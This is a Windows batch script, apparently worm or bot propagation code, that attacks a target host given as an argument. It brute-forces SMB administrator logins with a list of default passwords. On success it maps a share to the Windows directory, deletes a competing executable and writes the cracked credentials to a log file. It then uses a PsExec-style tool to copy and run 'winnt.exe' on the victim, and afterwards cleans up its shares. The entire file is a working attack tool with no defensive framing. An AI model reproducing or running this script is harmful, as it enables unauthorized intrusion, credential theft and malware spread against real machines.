   @echo off
   net use \\%1\IPC$ "justatest" "/user:sexymachine"
   if not errorlevel 1 goto manualroot
   net use \\%1\IPC$ "asdf" "/user:Admin"
   if not errorlevel 1 goto admind
   net use \\%1\IPC$ "1234" "/user:Admin"
   if not errorlevel 1 goto adminl
   net use \\%1\IPC$ "1234" "/user:Administrator"
   if not errorlevel 1 goto adminm
   net use \\%1\IPC$ "server" "/user:Admin"
   if not errorlevel 1 goto admine
   net use \\%1\IPC$ "server" "/user:Administrator"
   if not errorlevel 1 goto adminc
   net use \\%1\IPC$ "asdf" "/user:Administrator"
   if not errorlevel 1 goto admina
   net use \\%1\IPC$ "" "/user:Administrator"
   if not errorlevel 1 goto adminb
   net use \\%1\IPC$ "administrator" "/user:Administrator"
   if not errorlevel 1 goto adminf
   net use \\%1\IPC$ "admin" "/user:Administrator"
   if not errorlevel 1 goto admink
   net use \\%1\IPC$ "" "/user:Admin"
   if not errorlevel 1 goto adminh
   net use \\%1\IPC$ "admin" "/user:Admin"
   if not errorlevel 1 goto adminj
   net use \\%1\IPC$ "administrator" "/user:Admin"
   if not errorlevel 1 goto adming
   if errorlevel 1 goto end
   :admina
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Administrator, Password: asdf >> %1.txt
   psec.exe \\%1 -u "Administrator" -p "asdf" -c -d -f winnt.exe
   goto end
   :adminb
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Administrator, Password: (BLANK) >> %1.txt
   psec.exe \\%1 -u "Administrator" -p "" -c -d -f winnt.exe
   goto end
   :adminc
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Administrator, Password: server >> %1.txt
   psec.exe \\%1 -u "Administrator" -p "server" -c -d -f winnt.exe
   goto end
   :admind
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Admin, Password: asdf >> %1.txt
   psec.exe \\%1 -u "Admin" -p "asdf" -c -d -f winnt.exe
   goto end
   :admine
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Admin, Password: server >> %1.txt
   psec.exe \\%1 -u: "Admin" -p "server" -c -d -f winnt.exe
   goto end
   :adminf
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Administrator, Password: administrator >> %1.txt
   psec.exe \\%1 -u "Administrator" -p "administrator" -c -d -f winnt.exe
   goto end
   :adming
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Administrator, Password: admin >> %1.txt
   psec.exe \\%1 -u "Administrator" -p "admin" -c -d -f winnt.exe
   goto end
   :adminh
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Admin, Password: (BLANK) >> %1.txt
   psec.exe \\%1 -u "Admin" -p "" -c -d -f winnt.exe
   goto end
   :adminj
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Admin, Password: admin >> %1.txt
   psec.exe \\%1 -u "Admin" -p "admin" -c -d -f winnt.exe
   goto end
   :admink
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Admin, Password: administrator >> %1.txt
   psec.exe \\%1 -u "Admin" -p "administrator" -c -d -f winnt.exe
   goto end
   :adminl
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Admin, Password: 1234 >> %1.txt
   psec.exe \\%1 -u "Admin" -p "1234" -c -d -f winnt.exe
   goto end
   :adminm
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   del \\%1\ADDIN$\system32\gunit.exe
   if not errorlevel 1 echo %1 has been assimulated. Username: Administrator, Password: 1234 >> %1.txt
   psec.exe \\%1 -u "Administrator" -p "1234" -c -d -f winnt.exe
   goto end
   :manualroot
   net use \\%1\IPC$ /del
   net use \\%1\C$ "asdf" "/user:Admin"
   net use \\%1\C$ "1234" "/user:Admin"
   net use \\%1\C$ "1234" "/user:Administrator"
   net use \\%1\C$ "server" "/user:Admin"
   net use \\%1\C$ "server" "/user:Administrator"
   net use \\%1\C$ "asdf" "/user:Administrator"
   net use \\%1\C$ "" "/user:Administrator"
   net use \\%1\C$ "administrator" "/user:Administrator"
   net use \\%1\C$ "admin" "/user:Administrator"
   net use \\%1\C$ "" "/user:Admin"
   net use \\%1\C$ "admin" "/user:Admin"
   net use \\%1\C$ "administrator" "/user:Admin"
   RMTSHARE \\%1\ADDIN$=C:\WINNT
   RMTSHARE \\%1\ADDIN$=C:\WINDOWS
   psec.exe \\%1 -u "Administrator" -p "asdf" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Administrator" -p "" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Administrator" -p "server" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Admin" -p "asdf" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u: "Admin" -p "server" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Administrator" -p "administrator" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Administrator" -p "admin" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Admin" -p "" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Admin" -p "admin" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Admin" -p "administrator" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Admin" -p "1234" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   psec.exe \\%1 -u "Administrator" -p "1234" -c -d -f winnt.exe
   net use \\%1\IPC$ /del
   goto end
   :end
   RMTSHARE \\%1\ADDIN$ /del
   net use \\%1\IPC$ /del
   net use \\%1\C$ /del
   net use \\%1\ADMIN$ /del
   exit
   quit
